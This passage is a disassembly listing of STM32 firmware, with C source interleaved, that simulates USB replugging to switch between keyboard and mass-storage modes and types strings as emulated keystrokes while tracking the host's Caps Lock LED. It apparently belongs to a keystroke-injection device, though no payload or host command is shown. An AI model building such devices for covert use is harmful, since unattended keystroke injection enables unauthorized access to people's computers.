	  InterruptTrap(&InterruptFlag);
 800062c:	e7c7      	b.n	80005be <main+0x36>
 800062e:	bf00      	nop
 8000630:	20000978 	.word	0x20000978
 8000634:	2000025c 	.word	0x2000025c
 8000638:	20000270 	.word	0x20000270
 800063c:	40022000 	.word	0x40022000

08000640 <SystemClock_Config>:
/**
  * @brief System Clock Configuration
  * @retval None
  */
void SystemClock_Config(void)
{
 8000640:	b580      	push	{r7, lr}
 8000642:	b096      	sub	sp, #88	; 0x58
 8000644:	af00      	add	r7, sp, #0
  RCC_OscInitTypeDef RCC_OscInitStruct = {0};
 8000646:	f107 0314 	add.w	r3, r7, #20
 800064a:	2244      	movs	r2, #68	; 0x44
 800064c:	2100      	movs	r1, #0
 800064e:	4618      	mov	r0, r3
 8000650:	f00c fcbe 	bl	800cfd0 <memset>
  RCC_ClkInitTypeDef RCC_ClkInitStruct = {0};
 8000654:	463b      	mov	r3, r7
 8000656:	2200      	movs	r2, #0
 8000658:	601a      	str	r2, [r3, #0]
 800065a:	605a      	str	r2, [r3, #4]
 800065c:	609a      	str	r2, [r3, #8]
 800065e:	60da      	str	r2, [r3, #12]
 8000660:	611a      	str	r2, [r3, #16]

  /** Configure the main internal regulator output voltage
  */
  if (HAL_PWREx_ControlVoltageScaling(PWR_REGULATOR_VOLTAGE_SCALE1) != HAL_OK)
 8000662:	f44f 7000 	mov.w	r0, #512	; 0x200
 8000666:	f003 f8bb 	bl	80037e0 <HAL_PWREx_ControlVoltageScaling>
 800066a:	4603      	mov	r3, r0
 800066c:	2b00      	cmp	r3, #0
 800066e:	d001      	beq.n	8000674 <SystemClock_Config+0x34>
  {
    Error_Handler();
 8000670:	f000 fb00 	bl	8000c74 <Error_Handler>
  }

  /** Configure LSE Drive Capability
  */
  HAL_PWR_EnableBkUpAccess();
 8000674:	f003 f896 	bl	80037a4 <HAL_PWR_EnableBkUpAccess>
  __HAL_RCC_LSEDRIVE_CONFIG(RCC_LSEDRIVE_LOW);
 8000678:	4b21      	ldr	r3, [pc, #132]	; (8000700 <SystemClock_Config+0xc0>)
 800067a:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 800067e:	4a20      	ldr	r2, [pc, #128]	; (8000700 <SystemClock_Config+0xc0>)
 8000680:	f023 0318 	bic.w	r3, r3, #24
 8000684:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90

  /** Initializes the RCC Oscillators according to the specified parameters
  * in the RCC_OscInitTypeDef structure.
  */
  RCC_OscInitStruct.OscillatorType = RCC_OSCILLATORTYPE_LSE|RCC_OSCILLATORTYPE_MSI;
 8000688:	2314      	movs	r3, #20
 800068a:	617b      	str	r3, [r7, #20]
  RCC_OscInitStruct.LSEState = RCC_LSE_ON;
 800068c:	2301      	movs	r3, #1
 800068e:	61fb      	str	r3, [r7, #28]
  RCC_OscInitStruct.MSIState = RCC_MSI_ON;
 8000690:	2301      	movs	r3, #1
 8000692:	62fb      	str	r3, [r7, #44]	; 0x2c
  RCC_OscInitStruct.MSICalibrationValue = 0;
 8000694:	2300      	movs	r3, #0
 8000696:	633b      	str	r3, [r7, #48]	; 0x30
  RCC_OscInitStruct.MSIClockRange = RCC_MSIRANGE_6;
 8000698:	2360      	movs	r3, #96	; 0x60
 800069a:	637b      	str	r3, [r7, #52]	; 0x34
  RCC_OscInitStruct.PLL.PLLState = RCC_PLL_ON;
 800069c:	2302      	movs	r3, #2
 800069e:	63fb      	str	r3, [r7, #60]	; 0x3c
  RCC_OscInitStruct.PLL.PLLSource = RCC_PLLSOURCE_MSI;
 80006a0:	2301      	movs	r3, #1
 80006a2:	643b      	str	r3, [r7, #64]	; 0x40
  RCC_OscInitStruct.PLL.PLLM = 1;
 80006a4:	2301      	movs	r3, #1
 80006a6:	647b      	str	r3, [r7, #68]	; 0x44
  RCC_OscInitStruct.PLL.PLLN = 24;
 80006a8:	2318      	movs	r3, #24
 80006aa:	64bb      	str	r3, [r7, #72]	; 0x48
  RCC_OscInitStruct.PLL.PLLP = RCC_PLLP_DIV7;
 80006ac:	2307      	movs	r3, #7
 80006ae:	64fb      	str	r3, [r7, #76]	; 0x4c
  RCC_OscInitStruct.PLL.PLLQ = RCC_PLLQ_DIV2;
 80006b0:	2302      	movs	r3, #2
 80006b2:	653b      	str	r3, [r7, #80]	; 0x50
  RCC_OscInitStruct.PLL.PLLR = RCC_PLLR_DIV2;
 80006b4:	2302      	movs	r3, #2
 80006b6:	657b      	str	r3, [r7, #84]	; 0x54
  if (HAL_RCC_OscConfig(&RCC_OscInitStruct) != HAL_OK)
 80006b8:	f107 0314 	add.w	r3, r7, #20
 80006bc:	4618      	mov	r0, r3
 80006be:	f003 f8f5 	bl	80038ac <HAL_RCC_OscConfig>
 80006c2:	4603      	mov	r3, r0
 80006c4:	2b00      	cmp	r3, #0
 80006c6:	d001      	beq.n	80006cc <SystemClock_Config+0x8c>
  {
    Error_Handler();
 80006c8:	f000 fad4 	bl	8000c74 <Error_Handler>
  }

  /** Initializes the CPU, AHB and APB buses clocks
  */
  RCC_ClkInitStruct.ClockType = RCC_CLOCKTYPE_HCLK|RCC_CLOCKTYPE_SYSCLK
 80006cc:	230f      	movs	r3, #15
 80006ce:	603b      	str	r3, [r7, #0]
                              |RCC_CLOCKTYPE_PCLK1|RCC_CLOCKTYPE_PCLK2;
  RCC_ClkInitStruct.SYSCLKSource = RCC_SYSCLKSOURCE_PLLCLK;
 80006d0:	2303      	movs	r3, #3
 80006d2:	607b      	str	r3, [r7, #4]
  RCC_ClkInitStruct.AHBCLKDivider = RCC_SYSCLK_DIV1;
 80006d4:	2300      	movs	r3, #0
 80006d6:	60bb      	str	r3, [r7, #8]
  RCC_ClkInitStruct.APB1CLKDivider = RCC_HCLK_DIV1;
 80006d8:	2300      	movs	r3, #0
 80006da:	60fb      	str	r3, [r7, #12]
  RCC_ClkInitStruct.APB2CLKDivider = RCC_HCLK_DIV1;
 80006dc:	2300      	movs	r3, #0
 80006de:	613b      	str	r3, [r7, #16]

  if (HAL_RCC_ClockConfig(&RCC_ClkInitStruct, FLASH_LATENCY_2) != HAL_OK)
 80006e0:	463b      	mov	r3, r7
 80006e2:	2102      	movs	r1, #2
 80006e4:	4618      	mov	r0, r3
 80006e6:	f003 fcf5 	bl	80040d4 <HAL_RCC_ClockConfig>
 80006ea:	4603      	mov	r3, r0
 80006ec:	2b00      	cmp	r3, #0
 80006ee:	d001      	beq.n	80006f4 <SystemClock_Config+0xb4>
  {
    Error_Handler();
 80006f0:	f000 fac0 	bl	8000c74 <Error_Handler>
  }

  /** Enable MSI Auto calibration
  */
  HAL_RCCEx_EnableMSIPLLMode();
 80006f4:	f004 f908 	bl	8004908 <HAL_RCCEx_EnableMSIPLLMode>
}
 80006f8:	bf00      	nop
 80006fa:	3758      	adds	r7, #88	; 0x58
 80006fc:	46bd      	mov	sp, r7
 80006fe:	bd80      	pop	{r7, pc}
 8000700:	40021000 	.word	0x40021000

08000704 <SimulateUSB_unplug>:

/* USER CODE BEGIN 4 */
void SimulateUSB_unplug(){
 8000704:	b580      	push	{r7, lr}
 8000706:	af00      	add	r7, sp, #0
	HAL_GPIO_WritePin(GPIOA, GPIO_PIN_12, GPIO_PIN_RESET);
 8000708:	2200      	movs	r2, #0
 800070a:	f44f 5180 	mov.w	r1, #4096	; 0x1000
 800070e:	f04f 4090 	mov.w	r0, #1207959552	; 0x48000000
 8000712:	f001 fa6b 	bl	8001bec <HAL_GPIO_WritePin>
}
 8000716:	bf00      	nop
 8000718:	bd80      	pop	{r7, pc}

0800071a <SimulateUSB_plugin>:

void SimulateUSB_plugin(){
 800071a:	b580      	push	{r7, lr}
 800071c:	af00      	add	r7, sp, #0
	HAL_GPIO_WritePin(GPIOA, GPIO_PIN_12, GPIO_PIN_SET);
 800071e:	2201      	movs	r2, #1
 8000720:	f44f 5180 	mov.w	r1, #4096	; 0x1000
 8000724:	f04f 4090 	mov.w	r0, #1207959552	; 0x48000000
 8000728:	f001 fa60 	bl	8001bec <HAL_GPIO_WritePin>
}
 800072c:	bf00      	nop
 800072e:	bd80      	pop	{r7, pc}

08000730 <SwitchToHID>:

void SwitchToHID(){
 8000730:	b580      	push	{r7, lr}
 8000732:	af00      	add	r7, sp, #0
	SimulateUSB_unplug();
 8000734:	f7ff ffe6 	bl	8000704 <SimulateUSB_unplug>
	isMSC = 0;
 8000738:	4b08      	ldr	r3, [pc, #32]	; (800075c <SwitchToHID+0x2c>)
 800073a:	2200      	movs	r2, #0
 800073c:	601a      	str	r2, [r3, #0]
	HAL_Delay(PlugSlot);
 800073e:	2032      	movs	r0, #50	; 0x32
 8000740:	f000 fd3c 	bl	80011bc <HAL_Delay>
	SimulateUSB_plugin();
 8000744:	f7ff ffe9 	bl	800071a <SimulateUSB_plugin>
	MX_TIM2_Init();
 8000748:	f000 fb8e 	bl	8000e68 <MX_TIM2_Init>
	MX_USB_DEVICE_Init();
 800074c:	f00b fe08 	bl	800c360 <MX_USB_DEVICE_Init>
	HAL_Delay(SwitchDeviceSlot);
 8000750:	f640 30b8 	movw	r0, #3000	; 0xbb8
 8000754:	f000 fd32 	bl	80011bc <HAL_Delay>
}
 8000758:	bf00      	nop
 800075a:	bd80      	pop	{r7, pc}
 800075c:	20000978 	.word	0x20000978

08000760 <SwitchToMSC>:

void SwitchToMSC(){
 8000760:	b580      	push	{r7, lr}
 8000762:	af00      	add	r7, sp, #0
	SimulateUSB_unplug();
 8000764:	f7ff ffce 	bl	8000704 <SimulateUSB_unplug>
	isMSC = 1;
 8000768:	4b07      	ldr	r3, [pc, #28]	; (8000788 <SwitchToMSC+0x28>)
 800076a:	2201      	movs	r2, #1
 800076c:	601a      	str	r2, [r3, #0]
	HAL_Delay(PlugSlot);
 800076e:	2032      	movs	r0, #50	; 0x32
 8000770:	f000 fd24 	bl	80011bc <HAL_Delay>
	SimulateUSB_plugin();
 8000774:	f7ff ffd1 	bl	800071a <SimulateUSB_plugin>
	MX_USB_DEVICE_Init_MSC();
 8000778:	f00b fe22 	bl	800c3c0 <MX_USB_DEVICE_Init_MSC>
	HAL_Delay(SwitchDeviceSlot);
 800077c:	f640 30b8 	movw	r0, #3000	; 0xbb8
 8000780:	f000 fd1c 	bl	80011bc <HAL_Delay>
}
 8000784:	bf00      	nop
 8000786:	bd80      	pop	{r7, pc}
 8000788:	20000978 	.word	0x20000978

0800078c <Get_Single_Descriptor>:

void Get_Single_Descriptor(uint8_t ascii){
 800078c:	b580      	push	{r7, lr}
 800078e:	b0a4      	sub	sp, #144	; 0x90
 8000790:	af00      	add	r7, sp, #0
 8000792:	4603      	mov	r3, r0
 8000794:	71fb      	strb	r3, [r7, #7]
	memset(sent_buffer, 0x00, sizeof(uint8_t)*USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 8000796:	220f      	movs	r2, #15
 8000798:	2100      	movs	r1, #0
 800079a:	4821      	ldr	r0, [pc, #132]	; (8000820 <Get_Single_Descriptor+0x94>)
 800079c:	f00c fc18 	bl	800cfd0 <memset>
	uint8_t Map[MapLen] = Map_Init;
 80007a0:	4a20      	ldr	r2, [pc, #128]	; (8000824 <Get_Single_Descriptor+0x98>)
 80007a2:	f107 0308 	add.w	r3, r7, #8
 80007a6:	4611      	mov	r1, r2
 80007a8:	2285      	movs	r2, #133	; 0x85
 80007aa:	4618      	mov	r0, r3
 80007ac:	f00c fc3c 	bl	800d028 <memcpy>
	Convert2CapsMap(Map);
 80007b0:	f107 0308 	add.w	r3, r7, #8
 80007b4:	4618      	mov	r0, r3
 80007b6:	f000 f93f 	bl	8000a38 <Convert2CapsMap>
	uint8_t pos = Map[ascii];
 80007ba:	79fb      	ldrb	r3, [r7, #7]
 80007bc:	3390      	adds	r3, #144	; 0x90
 80007be:	443b      	add	r3, r7
 80007c0:	f813 3c88 	ldrb.w	r3, [r3, #-136]
 80007c4:	f887 308f 	strb.w	r3, [r7, #143]	; 0x8f
	sent_buffer[(uint8_t)(pos>>4)] |= (1<<((uint8_t)(pos&0x07)));
 80007c8:	f897 308f 	ldrb.w	r3, [r7, #143]	; 0x8f
 80007cc:	091b      	lsrs	r3, r3, #4
 80007ce:	b2db      	uxtb	r3, r3
 80007d0:	461a      	mov	r2, r3
 80007d2:	4b13      	ldr	r3, [pc, #76]	; (8000820 <Get_Single_Descriptor+0x94>)
 80007d4:	5c9b      	ldrb	r3, [r3, r2]
 80007d6:	b25a      	sxtb	r2, r3
 80007d8:	f897 308f 	ldrb.w	r3, [r7, #143]	; 0x8f
 80007dc:	f003 0307 	and.w	r3, r3, #7
 80007e0:	2101      	movs	r1, #1
 80007e2:	fa01 f303 	lsl.w	r3, r1, r3
 80007e6:	b25b      	sxtb	r3, r3
 80007e8:	4313      	orrs	r3, r2
 80007ea:	b259      	sxtb	r1, r3
 80007ec:	f897 308f 	ldrb.w	r3, [r7, #143]	; 0x8f
 80007f0:	091b      	lsrs	r3, r3, #4
 80007f2:	b2db      	uxtb	r3, r3
 80007f4:	461a      	mov	r2, r3
 80007f6:	b2c9      	uxtb	r1, r1
 80007f8:	4b09      	ldr	r3, [pc, #36]	; (8000820 <Get_Single_Descriptor+0x94>)
 80007fa:	5499      	strb	r1, [r3, r2]
	if((pos&0x08) == 8)
 80007fc:	f897 308f 	ldrb.w	r3, [r7, #143]	; 0x8f
 8000800:	f003 0308 	and.w	r3, r3, #8
 8000804:	2b00      	cmp	r3, #0
 8000806:	d006      	beq.n	8000816 <Get_Single_Descriptor+0x8a>
		sent_buffer[0] |= 0x02;
 8000808:	4b05      	ldr	r3, [pc, #20]	; (8000820 <Get_Single_Descriptor+0x94>)
 800080a:	781b      	ldrb	r3, [r3, #0]
 800080c:	f043 0302 	orr.w	r3, r3, #2
 8000810:	b2da      	uxtb	r2, r3
 8000812:	4b03      	ldr	r3, [pc, #12]	; (8000820 <Get_Single_Descriptor+0x94>)
 8000814:	701a      	strb	r2, [r3, #0]
}
 8000816:	bf00      	nop
 8000818:	3790      	adds	r7, #144	; 0x90
 800081a:	46bd      	mov	sp, r7
 800081c:	bd80      	pop	{r7, pc}
 800081e:	bf00      	nop
 8000820:	2000025c 	.word	0x2000025c
 8000824:	0800d05c 	.word	0x0800d05c

08000828 <Get_Multi_Descriptor>:

/*Designed for shortcut key combinations to obtain data packets:
 * for simultaneously pressing multiple keys*/
void Get_Multi_Descriptor(uint8_t *array, int num){
 8000828:	b580      	push	{r7, lr}
 800082a:	b0a6      	sub	sp, #152	; 0x98
 800082c:	af00      	add	r7, sp, #0
 800082e:	6078      	str	r0, [r7, #4]
 8000830:	6039      	str	r1, [r7, #0]
	memset(sent_buffer, 0x00, sizeof(uint8_t)*USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 8000832:	220f      	movs	r2, #15
 8000834:	2100      	movs	r1, #0
 8000836:	482a      	ldr	r0, [pc, #168]	; (80008e0 <Get_Multi_Descriptor+0xb8>)
 8000838:	f00c fbca 	bl	800cfd0 <memset>
	uint8_t Map[MapLen] = Map_Init;
 800083c:	4a29      	ldr	r2, [pc, #164]	; (80008e4 <Get_Multi_Descriptor+0xbc>)
 800083e:	f107 030c 	add.w	r3, r7, #12
 8000842:	4611      	mov	r1, r2
 8000844:	2285      	movs	r2, #133	; 0x85
 8000846:	4618      	mov	r0, r3
 8000848:	f00c fbee 	bl	800d028 <memcpy>
	Convert2CapsMap(Map);
 800084c:	f107 030c 	add.w	r3, r7, #12
 8000850:	4618      	mov	r0, r3
 8000852:	f000 f8f1 	bl	8000a38 <Convert2CapsMap>
	for(int i = 0; i < num; i++){
 8000856:	2300      	movs	r3, #0
 8000858:	f8c7 3094 	str.w	r3, [r7, #148]	; 0x94
 800085c:	e036      	b.n	80008cc <Get_Multi_Descriptor+0xa4>
		uint8_t pos = Map[array[i]];
 800085e:	f8d7 3094 	ldr.w	r3, [r7, #148]	; 0x94
 8000862:	687a      	ldr	r2, [r7, #4]
 8000864:	4413      	add	r3, r2
 8000866:	781b      	ldrb	r3, [r3, #0]
 8000868:	3398      	adds	r3, #152	; 0x98
 800086a:	443b      	add	r3, r7
 800086c:	f813 3c8c 	ldrb.w	r3, [r3, #-140]
 8000870:	f887 3093 	strb.w	r3, [r7, #147]	; 0x93
		sent_buffer[(uint8_t)(pos>>4)] |= (1<<((uint8_t)(pos&0x07)));
 8000874:	f897 3093 	ldrb.w	r3, [r7, #147]	; 0x93
 8000878:	091b      	lsrs	r3, r3, #4
 800087a:	b2db      	uxtb	r3, r3
 800087c:	461a      	mov	r2, r3
 800087e:	4b18      	ldr	r3, [pc, #96]	; (80008e0 <Get_Multi_Descriptor+0xb8>)
 8000880:	5c9b      	ldrb	r3, [r3, r2]
 8000882:	b25a      	sxtb	r2, r3
 8000884:	f897 3093 	ldrb.w	r3, [r7, #147]	; 0x93
 8000888:	f003 0307 	and.w	r3, r3, #7
 800088c:	2101      	movs	r1, #1
 800088e:	fa01 f303 	lsl.w	r3, r1, r3
 8000892:	b25b      	sxtb	r3, r3
 8000894:	4313      	orrs	r3, r2
 8000896:	b259      	sxtb	r1, r3
 8000898:	f897 3093 	ldrb.w	r3, [r7, #147]	; 0x93
 800089c:	091b      	lsrs	r3, r3, #4
 800089e:	b2db      	uxtb	r3, r3
 80008a0:	461a      	mov	r2, r3
 80008a2:	b2c9      	uxtb	r1, r1
 80008a4:	4b0e      	ldr	r3, [pc, #56]	; (80008e0 <Get_Multi_Descriptor+0xb8>)
 80008a6:	5499      	strb	r1, [r3, r2]
		if((pos&0x08) == 8)
 80008a8:	f897 3093 	ldrb.w	r3, [r7, #147]	; 0x93
 80008ac:	f003 0308 	and.w	r3, r3, #8
 80008b0:	2b00      	cmp	r3, #0
 80008b2:	d006      	beq.n	80008c2 <Get_Multi_Descriptor+0x9a>
			sent_buffer[0] |= 0x02;
 80008b4:	4b0a      	ldr	r3, [pc, #40]	; (80008e0 <Get_Multi_Descriptor+0xb8>)
 80008b6:	781b      	ldrb	r3, [r3, #0]
 80008b8:	f043 0302 	orr.w	r3, r3, #2
 80008bc:	b2da      	uxtb	r2, r3
 80008be:	4b08      	ldr	r3, [pc, #32]	; (80008e0 <Get_Multi_Descriptor+0xb8>)
 80008c0:	701a      	strb	r2, [r3, #0]
	for(int i = 0; i < num; i++){
 80008c2:	f8d7 3094 	ldr.w	r3, [r7, #148]	; 0x94
 80008c6:	3301      	adds	r3, #1
 80008c8:	f8c7 3094 	str.w	r3, [r7, #148]	; 0x94
 80008cc:	f8d7 2094 	ldr.w	r2, [r7, #148]	; 0x94
 80008d0:	683b      	ldr	r3, [r7, #0]
 80008d2:	429a      	cmp	r2, r3
 80008d4:	dbc3      	blt.n	800085e <Get_Multi_Descriptor+0x36>
	}
}
 80008d6:	bf00      	nop
 80008d8:	bf00      	nop
 80008da:	3798      	adds	r7, #152	; 0x98
 80008dc:	46bd      	mov	sp, r7
 80008de:	bd80      	pop	{r7, pc}
 80008e0:	2000025c 	.word	0x2000025c
 80008e4:	0800d05c 	.word	0x0800d05c

080008e8 <SimulateKeyPress>:

void SimulateKeyPress(uint8_t ascii){
 80008e8:	b580      	push	{r7, lr}
 80008ea:	b082      	sub	sp, #8
 80008ec:	af00      	add	r7, sp, #0
 80008ee:	4603      	mov	r3, r0
 80008f0:	71fb      	strb	r3, [r7, #7]
	//get key:ascii Descriptor
	Get_Single_Descriptor(ascii);
 80008f2:	79fb      	ldrb	r3, [r7, #7]
 80008f4:	4618      	mov	r0, r3
 80008f6:	f7ff ff49 	bl	800078c <Get_Single_Descriptor>
	//Sent Descriptor report
	USBD_CUSTOM_HID_SendReport(&hUsbDeviceFS, sent_buffer, USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 80008fa:	220f      	movs	r2, #15
 80008fc:	4903      	ldr	r1, [pc, #12]	; (800090c <SimulateKeyPress+0x24>)
 80008fe:	4804      	ldr	r0, [pc, #16]	; (8000910 <SimulateKeyPress+0x28>)
 8000900:	f008 f86c 	bl	80089dc <USBD_CUSTOM_HID_SendReport>
}
 8000904:	bf00      	nop
 8000906:	3708      	adds	r7, #8
 8000908:	46bd      	mov	sp, r7
 800090a:	bd80      	pop	{r7, pc}
 800090c:	2000025c 	.word	0x2000025c
 8000910:	200003c0 	.word	0x200003c0

08000914 <SimulateKeyRelease>:

void SimulateKeyRelease(){
 8000914:	b580      	push	{r7, lr}
 8000916:	af00      	add	r7, sp, #0
	//set 0
	memset(sent_buffer, 0x00, sizeof(uint8_t)*USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 8000918:	220f      	movs	r2, #15
 800091a:	2100      	movs	r1, #0
 800091c:	4804      	ldr	r0, [pc, #16]	; (8000930 <SimulateKeyRelease+0x1c>)
 800091e:	f00c fb57 	bl	800cfd0 <memset>
	//Sent Descriptor report
	USBD_CUSTOM_HID_SendReport(&hUsbDeviceFS, sent_buffer, USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 8000922:	220f      	movs	r2, #15
 8000924:	4902      	ldr	r1, [pc, #8]	; (8000930 <SimulateKeyRelease+0x1c>)
 8000926:	4803      	ldr	r0, [pc, #12]	; (8000934 <SimulateKeyRelease+0x20>)
 8000928:	f008 f858 	bl	80089dc <USBD_CUSTOM_HID_SendReport>
}
 800092c:	bf00      	nop
 800092e:	bd80      	pop	{r7, pc}
 8000930:	2000025c 	.word	0x2000025c
 8000934:	200003c0 	.word	0x200003c0

08000938 <SimulateKeyStroke>:

void SimulateKeyStroke(uint8_t ascii){
 8000938:	b580      	push	{r7, lr}
 800093a:	b082      	sub	sp, #8
 800093c:	af00      	add	r7, sp, #0
 800093e:	4603      	mov	r3, r0
 8000940:	71fb      	strb	r3, [r7, #7]
	SimulateKeyPress(ascii);
 8000942:	79fb      	ldrb	r3, [r7, #7]
 8000944:	4618      	mov	r0, r3
 8000946:	f7ff ffcf 	bl	80008e8 <SimulateKeyPress>
	HAL_Delay(StrokeSlot); //Wait StrokeSlot time
 800094a:	2023      	movs	r0, #35	; 0x23
 800094c:	f000 fc36 	bl	80011bc <HAL_Delay>
	SimulateKeyRelease();
 8000950:	f7ff ffe0 	bl	8000914 <SimulateKeyRelease>
	HAL_Delay(StrokeSlot); //Wait StrokeSlot time
 8000954:	2023      	movs	r0, #35	; 0x23
 8000956:	f000 fc31 	bl	80011bc <HAL_Delay>
}
 800095a:	bf00      	nop
 800095c:	3708      	adds	r7, #8
 800095e:	46bd      	mov	sp, r7
 8000960:	bd80      	pop	{r7, pc}
	...

08000964 <SimulateShortcutKey>:

void SimulateShortcutKey(uint8_t *array, int num){
 8000964:	b580      	push	{r7, lr}
 8000966:	b082      	sub	sp, #8
 8000968:	af00      	add	r7, sp, #0
 800096a:	6078      	str	r0, [r7, #4]
 800096c:	6039      	str	r1, [r7, #0]
	Get_Multi_Descriptor(array, num);
 800096e:	6839      	ldr	r1, [r7, #0]
 8000970:	6878      	ldr	r0, [r7, #4]
 8000972:	f7ff ff59 	bl	8000828 <Get_Multi_Descriptor>
	while((recv_buffer[0]&0x02) != 0x02){
 8000976:	e002      	b.n	800097e <SimulateShortcutKey+0x1a>
		SimulateKeyStroke(128);
 8000978:	2080      	movs	r0, #128	; 0x80
 800097a:	f7ff ffdd 	bl	8000938 <SimulateKeyStroke>
	while((recv_buffer[0]&0x02) != 0x02){
 800097e:	4b0c      	ldr	r3, [pc, #48]	; (80009b0 <SimulateShortcutKey+0x4c>)
 8000980:	781b      	ldrb	r3, [r3, #0]
 8000982:	f003 0302 	and.w	r3, r3, #2
 8000986:	2b00      	cmp	r3, #0
 8000988:	d0f6      	beq.n	8000978 <SimulateShortcutKey+0x14>
	}
	USBD_CUSTOM_HID_SendReport(&hUsbDeviceFS, sent_buffer, USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 800098a:	220f      	movs	r2, #15
 800098c:	4909      	ldr	r1, [pc, #36]	; (80009b4 <SimulateShortcutKey+0x50>)
 800098e:	480a      	ldr	r0, [pc, #40]	; (80009b8 <SimulateShortcutKey+0x54>)
 8000990:	f008 f824 	bl	80089dc <USBD_CUSTOM_HID_SendReport>
	HAL_Delay(StrokeSlot); //Wait StrokeSlot time
 8000994:	2023      	movs	r0, #35	; 0x23
 8000996:	f000 fc11 	bl	80011bc <HAL_Delay>
	SimulateKeyRelease();
 800099a:	f7ff ffbb 	bl	8000914 <SimulateKeyRelease>
	HAL_Delay(ShortcutSlot); //Wait to avoid conflict
 800099e:	f44f 7016 	mov.w	r0, #600	; 0x258
 80009a2:	f000 fc0b 	bl	80011bc <HAL_Delay>
}
 80009a6:	bf00      	nop
 80009a8:	3708      	adds	r7, #8
 80009aa:	46bd      	mov	sp, r7
 80009ac:	bd80      	pop	{r7, pc}
 80009ae:	bf00      	nop
 80009b0:	2000026c 	.word	0x2000026c
 80009b4:	2000025c 	.word	0x2000025c
 80009b8:	200003c0 	.word	0x200003c0

080009bc <SimulateKeyStrokes>:

void SimulateKeyStrokes(char *str, int len, int *cntNow){
 80009bc:	b580      	push	{r7, lr}
 80009be:	b084      	sub	sp, #16
 80009c0:	af00      	add	r7, sp, #0
 80009c2:	60f8      	str	r0, [r7, #12]
 80009c4:	60b9      	str	r1, [r7, #8]
 80009c6:	607a      	str	r2, [r7, #4]
	for(*cntNow = 0; *cntNow < len; (*cntNow)++){
 80009c8:	687b      	ldr	r3, [r7, #4]
 80009ca:	2200      	movs	r2, #0
 80009cc:	601a      	str	r2, [r3, #0]
 80009ce:	e025      	b.n	8000a1c <SimulateKeyStrokes+0x60>
    	//Ensure func SimulateKeyStroke is executed in uppercase environment.
		if((recv_buffer[0]&0x02) != 0x02){
 80009d0:	4b17      	ldr	r3, [pc, #92]	; (8000a30 <SimulateKeyStrokes+0x74>)
 80009d2:	781b      	ldrb	r3, [r3, #0]
 80009d4:	f003 0302 	and.w	r3, r3, #2
 80009d8:	2b00      	cmp	r3, #0
 80009da:	d102      	bne.n	80009e2 <SimulateKeyStrokes+0x26>
			SimulateKeyStroke(128);
 80009dc:	2080      	movs	r0, #128	; 0x80
 80009de:	f7ff ffab 	bl	8000938 <SimulateKeyStroke>
    	}
		SimulateKeyStroke(str[*cntNow]);
 80009e2:	687b      	ldr	r3, [r7, #4]
 80009e4:	681b      	ldr	r3, [r3, #0]
 80009e6:	461a      	mov	r2, r3
 80009e8:	68fb      	ldr	r3, [r7, #12]
 80009ea:	4413      	add	r3, r2
 80009ec:	781b      	ldrb	r3, [r3, #0]
 80009ee:	4618      	mov	r0, r3
 80009f0:	f7ff ffa2 	bl	8000938 <SimulateKeyStroke>
		//Determine if RollBack is necessary
		if(NeedRollBack == 1){
 80009f4:	4b0f      	ldr	r3, [pc, #60]	; (8000a34 <SimulateKeyStrokes+0x78>)
 80009f6:	681b      	ldr	r3, [r3, #0]
 80009f8:	2b01      	cmp	r3, #1
 80009fa:	d10a      	bne.n	8000a12 <SimulateKeyStrokes+0x56>
			NeedRollBack = 0;
 80009fc:	4b0d      	ldr	r3, [pc, #52]	; (8000a34 <SimulateKeyStrokes+0x78>)
 80009fe:	2200      	movs	r2, #0
 8000a00:	601a      	str	r2, [r3, #0]
			(*cntNow)--;
 8000a02:	687b      	ldr	r3, [r7, #4]
 8000a04:	681b      	ldr	r3, [r3, #0]
 8000a06:	1e5a      	subs	r2, r3, #1
 8000a08:	687b      	ldr	r3, [r7, #4]
 8000a0a:	601a      	str	r2, [r3, #0]
			SimulateKeyStroke(129);
 8000a0c:	2081      	movs	r0, #129	; 0x81
 8000a0e:	f7ff ff93 	bl	8000938 <SimulateKeyStroke>
	for(*cntNow = 0; *cntNow < len; (*cntNow)++){
 8000a12:	687b      	ldr	r3, [r7, #4]
 8000a14:	681b      	ldr	r3, [r3, #0]
 8000a16:	1c5a      	adds	r2, r3, #1
 8000a18:	687b      	ldr	r3, [r7, #4]
 8000a1a:	601a      	str	r2, [r3, #0]
 8000a1c:	687b      	ldr	r3, [r7, #4]
 8000a1e:	681b      	ldr	r3, [r3, #0]
 8000a20:	68ba      	ldr	r2, [r7, #8]
 8000a22:	429a      	cmp	r2, r3
 8000a24:	dcd4      	bgt.n	80009d0 <SimulateKeyStrokes+0x14>
		}
	}
}
 8000a26:	bf00      	nop
 8000a28:	bf00      	nop
 8000a2a:	3710      	adds	r7, #16
 8000a2c:	46bd      	mov	sp, r7
 8000a2e:	bd80      	pop	{r7, pc}
 8000a30:	2000026c 	.word	0x2000026c
 8000a34:	2000027c 	.word	0x2000027c

08000a38 <Convert2CapsMap>:
		SimulateKeyStroke(128);
		PrintRecvBuf(recv_buffer);  //print Keyboard LED Status
	}
}

void Convert2CapsMap(uint8_t LowerCaseMap[MapLen]){
 8000a38:	b480      	push	{r7}
 8000a3a:	b085      	sub	sp, #20
 8000a3c:	af00      	add	r7, sp, #0
 8000a3e:	6078      	str	r0, [r7, #4]
	for(uint8_t cnt = 'A'; cnt <= 'Z'; cnt++){
 8000a40:	2341      	movs	r3, #65	; 0x41
 8000a42:	73fb      	strb	r3, [r7, #15]
 8000a44:	e01a      	b.n	8000a7c <Convert2CapsMap+0x44>
		LowerCaseMap[cnt] &= 0xf7;
 8000a46:	7bfb      	ldrb	r3, [r7, #15]
 8000a48:	687a      	ldr	r2, [r7, #4]
 8000a4a:	4413      	add	r3, r2
 8000a4c:	781a      	ldrb	r2, [r3, #0]
 8000a4e:	7bfb      	ldrb	r3, [r7, #15]
 8000a50:	6879      	ldr	r1, [r7, #4]
 8000a52:	440b      	add	r3, r1
 8000a54:	f022 0208 	bic.w	r2, r2, #8
 8000a58:	b2d2      	uxtb	r2, r2
 8000a5a:	701a      	strb	r2, [r3, #0]
		LowerCaseMap[cnt+'a'-'A'] |= 0x08;
 8000a5c:	7bfb      	ldrb	r3, [r7, #15]
 8000a5e:	3320      	adds	r3, #32
